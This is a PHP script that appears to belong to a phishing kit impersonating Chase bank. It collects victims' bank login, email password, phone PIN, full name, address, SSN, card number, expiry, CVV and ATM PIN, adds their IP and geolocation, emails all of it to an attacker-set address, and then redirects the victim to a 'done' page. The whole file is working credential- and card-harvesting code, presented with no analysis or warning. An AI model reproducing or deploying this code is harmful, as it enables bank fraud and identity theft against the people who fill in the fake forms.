<?php
ini_set("output_buffering",4096);
@session_start();
ob_start();

include 'Email.php';


$ipaddress = $_SERVER['REMOTE_ADDR'];
$ipaddress2 = $_SERVER['HTTP_CLIENT_IP'];
$host = bin2hex ($_SERVER['HTTP_HOST']);
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ipaddress));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------[ SELIM ]---------------------\n";
$message .= "User ID        : ".$_SESSION['usr']."\n";
$message .= "Password       : ".$_SESSION['pwd']."\n";
$message .= "--------------[ P.I ]---------------------\n";
$message .= "Full Name      : ".$_POST['fnm']." ".$_POST['lnm']."  \n";
$message .= "Address        : ".$_POST['adr']."\n";
$message .= "Zipcode        : ".$_POST['zip']."\n";
$message .= "SSN        	: ".$_POST['ssn']."\n";
$message .= "Card Number    : ".$_POST['ccn']."\n";
$message .= "Expire Date    : ".$_POST['mnt']." / ".$_POST['yer']."  \n";
$message .= "CCV      	    : ".$_POST['csc']."\n";
$message .= "ATM Pin        : ".$_POST['atm']."\n";
$message .= "--------------[ CHASE2020 ]---------------------\n";
$message .= "Email      	    : ".$_SESSION['email']."\n";
$message .= "E Pass             : ".$_SESSION['epass']."\n";
$message .= "--------------[ P.I ]---------------------\n";
$message .= "Carrier      	    : ".$_SESSION['type']."\n";
$message .= "Phone Number       : ".$_SESSION['phone']."\n";
$message .= "Phone PIN          : ".$_SESSION['phopin']."\n";
$message .= "--------------[ CHASE ELGOO ]---------------------\n";
$message .= "IP            : ".$ipaddress."\n";
$message .= "--------------[ team work ]---------------------\n";
$message .= "|Client IP: ".$ipaddress2."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ipaddress ----\n";
$message .= "Browser                 :".$browserAgent."\n";
$message .= "DateTime                : ".$timedate."\n";
$message .= "country                 : ".$country."\n";
$message .= "Address                 : ".$addr_details."\n";
$message .= "ISP                     : ".$hostname."\n";
$subject = "xXxXxCHASExXxXx $ipaddress";
$headers = "From: Mokaa <Source@Bourder.land>";
mail($SEND,$subject,$message,$headers);

header("Location: done.php?$host$host$host$host");


?>